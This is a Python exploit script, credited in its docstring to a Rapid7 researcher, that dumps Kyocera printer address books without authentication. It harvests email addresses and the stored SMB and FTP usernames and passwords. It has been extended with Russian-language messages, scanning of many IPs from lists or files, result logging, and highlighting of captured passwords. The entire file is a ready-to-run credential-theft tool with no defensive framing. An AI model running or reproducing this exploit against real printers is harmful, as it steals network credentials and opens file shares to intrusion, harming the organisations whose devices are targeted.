"""
Kyocera printer exploit
Extracts sensitive data stored in the printer address book, unauthenticated, including:
    *email addresses
    *SMB file share credentials used to write scan jobs to a network fileshare
    *FTP credentials

Author: Aaron Herndon, @ac3lives (Rapid7)
Date: 11/12/2021
Tested versions:
    * ECOSYS M2640idw
    *  TASKalfa 406ci
    *

Usage:
python3 getKyoceraCreds.py printerip
"""

import argparse
import re
import sys
import time
import warnings
from typing import Dict, Iterable, List, Optional, Sequence

import requests
import xmltodict

warnings.filterwarnings("ignore")


class Reporter:
    def __init__(self, file_path: Optional[str] = None):
        self.file = None
        self._ansi_re = re.compile(r"\x1b\[[0-9;]*m")
        if file_path:
            self.file = open(file_path, "w", encoding="utf-8")

    def write(self, message: str = "") -> None:
        print(message)
        if self.file:
            cleaned = self._ansi_re.sub("", message)
            self.file.write(cleaned + "\n")
            self.file.flush()

    def close(self) -> None:
        if self.file:
            self.file.close()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()


def parse_ip_input(values: Sequence[str]) -> List[str]:
    ips: List[str] = []
    for value in values:
        for ip in value.split(","):
            cleaned = ip.strip()
            if cleaned:
                ips.append(cleaned)
    return ips


def load_ips_from_file(path: str) -> List[str]:
    with open(path, "r", encoding="utf-8") as f:
        lines = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]
    return parse_ip_input(lines)


def build_request_body(action: str, payload: str) -> str:
    return (
        "<?xml version=\"1.0\" encoding=\"utf-8\"?>"
        "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://www.w3.org/2003/05/soap-envelope\" "
        "xmlns:SOAP-ENC=\"http://www.w3.org/2003/05/soap-encoding\" "
        "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" "
        "xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" "
        "xmlns:ns1=\"http://www.kyoceramita.com/ws/km-wsdl/setting/address_book\">"
        "<SOAP-ENV:Header>"
        f"<wsa:Action SOAP-ENV:mustUnderstand=\"true\">{action}</wsa:Action>"
        "</SOAP-ENV:Header>"
        f"<SOAP-ENV:Body>{payload}</SOAP-ENV:Body>"
        "</SOAP-ENV:Envelope>"
    )


def _find_by_local(obj: Dict, local: str):
    """Return value for the first key whose local name (after ':') matches."""
    for k, v in obj.items():
        if _local_name(k) == local:
            return v
    return None


def request_enumeration(url: str, headers: Dict[str, str], debug: bool = False) -> str:
    body = build_request_body(
        "http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration",
        "<ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest>",
    )
    response = requests.post(url, data=body, headers=headers, verify=False)
    if debug:
        print(f"[DEBUG] enumeration raw response:\n{response.content.decode('utf-8', errors='replace')}\n")
    parsed = xmltodict.parse(response.content.decode("utf-8"))
    soap_body = (parsed.get("SOAP-ENV:Envelope") or {}).get("SOAP-ENV:Body") or {}
    enum_response = _find_by_local(soap_body, "create_personal_address_enumerationResponse")
    if not enum_response:
        raise ValueError(f"create_personal_address_enumerationResponse не найден в теле ответа. Ключи: {list(soap_body.keys())}")
    enum_val = _find_by_local(enum_response, "enumeration")
    if not enum_val:
        raise ValueError(f"enumeration не найден в ответе. Ключи: {list(enum_response.keys())}")
    return str(enum_val)


def request_address_list(url: str, headers: Dict[str, str], enumeration: str, debug: bool = False):
    body = build_request_body(
        "http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list",
        f"<ns1:get_personal_address_listRequest><ns1:enumeration>{enumeration}</ns1:enumeration></ns1:get_personal_address_listRequest>",
    )
    response = requests.post(url, data=body, headers=headers, verify=False)
    if debug:
        print(f"[DEBUG] address_list raw response:\n{response.content.decode('utf-8', errors='replace')}\n")
    return xmltodict.parse(response.content.decode("utf-8"))


def _local_name(key: str) -> str:
    return key.split(":")[-1] if ":" in key else key


def find_credential_entries(data) -> List[Dict[str, str]]:
    """Walk parsed XML (xmltodict preserves 'ns:key' prefixes) and collect any
    dict that contains at least one credential-bearing field."""
    entries: List[Dict[str, str]] = []
    target_local = {"login_name", "user_name", "login_password", "email_address", "emailaddress"}

    def walk(obj):
        if isinstance(obj, dict):
            local_keys = {_local_name(k) for k in obj.keys()}
            if local_keys & target_local:
                entries.append(obj)
            for value in obj.values():
                walk(value)
        elif isinstance(obj, list):
            for item in obj:
                walk(item)

    walk(data)
    return entries


def _ensure_list(value):
    if value is None:
        return []
    if isinstance(value, list):
        return value
    return [value]


def parse_personal_addresses(body: Dict) -> List[Dict[str, str]]:
    response = body.get("kmaddrbook:get_personal_address_listResponse", {})
    personal = _ensure_list(response.get("kmaddrbook:personal_address"))

    parsed: List[Dict[str, str]] = []
    for item in personal:
        name_info = item.get("kmaddrbook:name_information", {})
        email_info = item.get("kmaddrbook:email_information", {})
        ftp_info = item.get("kmaddrbook:ftp_information", {})
        smb_info = item.get("kmaddrbook:smb_information", {})

        parsed.append(
            {
                "id": name_info.get("kmaddrbook:id"),
                "name": name_info.get("kmaddrbook:name"),
                "furigana": name_info.get("kmaddrbook:furigana"),
                "email": email_info.get("kmaddrbook:address"),
                "ftp_server": ftp_info.get("kmaddrbook:server_name"),
                "ftp_port": ftp_info.get("kmaddrbook:port_number"),
                "ftp_login": ftp_info.get("kmaddrbook:login_name")
                or ftp_info.get("kmaddrbook:user_name"),
                "ftp_password": ftp_info.get("kmaddrbook:login_password"),
                "smb_server": smb_info.get("kmaddrbook:server_name"),
                "smb_port": smb_info.get("kmaddrbook:port_number"),
                "smb_login": smb_info.get("kmaddrbook:login_name"),
                "smb_password": smb_info.get("kmaddrbook:login_password"),
            }
        )

    return parsed


def _highlight_password(value: str) -> str:
    if value is None:
        return ""

    is_terminal = sys.stdout.isatty()
    prefix = "\033[91m" if is_terminal else ""
    suffix = "\033[0m" if is_terminal else ""
    return f"{prefix}!! ПАРОЛЬ: {value} !!{suffix}"


def _format_value(label: str, value: Optional[str]) -> Optional[str]:
    if value in (None, ""):
        return None
    if "пароль" in label.lower() or "password" in label.lower():
        return _highlight_password(value)
    return str(value)


def display_address_book(addresses: Iterable[Dict[str, str]], reporter: Reporter) -> None:
    for idx, entry in enumerate(addresses, start=1):
        reporter.write(f"  Контакт {idx}:")
        for label, key in [
            ("ID", "id"),
            ("Имя", "name"),
            ("Фуригана", "furigana"),
            ("Email", "email"),
            ("FTP сервер", "ftp_server"),
            ("FTP порт", "ftp_port"),
            ("FTP логин", "ftp_login"),
            ("FTP пароль", "ftp_password"),
            ("SMB сервер", "smb_server"),
            ("SMB порт", "smb_port"),
            ("SMB логин", "smb_login"),
            ("SMB пароль", "smb_password"),
        ]:
            formatted = _format_value(label, entry.get(key))
            if formatted:
                reporter.write(f"    {label}: {formatted}")
        reporter.write()


def display_entries(entries: Iterable[Dict[str, str]], reporter: Reporter) -> None:
    for idx, entry in enumerate(entries, start=1):
        reporter.write(f"  Запись {idx}:")
        for key, value in entry.items():
            if isinstance(value, (dict, list)):
                continue
            label = _local_name(key)
            formatted = _format_value(label, value)
            if formatted:
                reporter.write(f"    {label}: {formatted}")
        reporter.write()


def process_printer(ip: str, reporter: Reporter, wait: int = 5, debug: bool = False) -> None:
    url = f"https://{ip}:9091/ws/km-wsdl/setting/address_book"
    headers = {"content-type": "application/soap+xml"}

    try:
        enumeration = request_enumeration(url, headers, debug=debug)
    except Exception as exc:  # noqa: BLE001
        reporter.write(f"[!] Не удалось получить объект адресной книги с {ip}: {exc}")
        return

    reporter.write(f"[*] Получен объект адресной книги {enumeration} от {ip}. Ожидание {wait}с...")
    time.sleep(wait)
    reporter.write("[*] Запрашиваем адресную книгу...")

    try:
        parsed_response = request_address_list(url, headers, enumeration, debug=debug)
    except Exception as exc:  # noqa: BLE001
        reporter.write(f"[!] Не удалось получить адресную книгу с {ip}: {exc}")
        return

    body = parsed_response.get("SOAP-ENV:Envelope", {}).get("SOAP-ENV:Body", {})
    entries = find_credential_entries(body)

    if entries:
        reporter.write(f"[+] Найдено записей с учётными данными: {len(entries)}")
        display_entries(entries, reporter)
    else:
        addresses = parse_personal_addresses(body)
        if addresses:
            reporter.write("[+] Записи адресной книги (явных паролей нет):")
            display_address_book(addresses, reporter)
        else:
            reporter.write("[!] Адресная книга пуста или структура ответа не распознана.")
            reporter.write("[!] Запусти с --debug чтобы увидеть сырой XML-ответ.")
            if debug:
                reporter.write(f"[DEBUG] body keys: {list(body.keys())}")
                reporter.write(f"[DEBUG] body: {body}")



def main(argv: Sequence[str]) -> None:
    parser = argparse.ArgumentParser(
        description="Извлечение адресной книги Kyocera без аутентификации",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("ips", nargs="*", help="IP-адреса (через пробел или запятую)")
    parser.add_argument(
        "-i",
        "--ip",
        dest="extra_ips",
        action="append",
        default=[],
        help="Дополнительные IP-адреса (можно перечислять через запятую)",
    )
    parser.add_argument(
        "-f",
        "--file",
        dest="file",
        help="Путь к файлу с IP-адресами (один в строке, можно через запятую)",
    )
    parser.add_argument(
        "-o",
        "--output",
        dest="output",
        help="Путь к файлу для сохранения результатов",
    )
    parser.add_argument(
        "-w",
        "--wait",
        dest="wait",
        type=int,
        default=5,
        help="Секунд ждать между запросами (по умолчанию 5)",
    )
    parser.add_argument(
        "-d",
        "--debug",
        dest="debug",
        action="store_true",
        help="Выводить сырые XML-ответы от принтера",
    )

    args = parser.parse_args(argv)

    ips: List[str] = []
    if args.file:
        ips.extend(load_ips_from_file(args.file))
    ips.extend(parse_ip_input(args.ips))
    ips.extend(parse_ip_input(args.extra_ips))

    if not ips:
        print("Необходимо указать хотя бы один IP-адрес (через аргумент, запятую или файл)")
        sys.exit(1)

    unique_ips = list(dict.fromkeys(ips))
    total = len(unique_ips)

    with Reporter(args.output) as reporter:
        for index, ip in enumerate(unique_ips, start=1):
            reporter.write(f"\n[{index}/{total}] Обработка {ip}")
            process_printer(ip, reporter, wait=args.wait, debug=args.debug)


if __name__ == "__main__":
    main(sys.argv[1:])
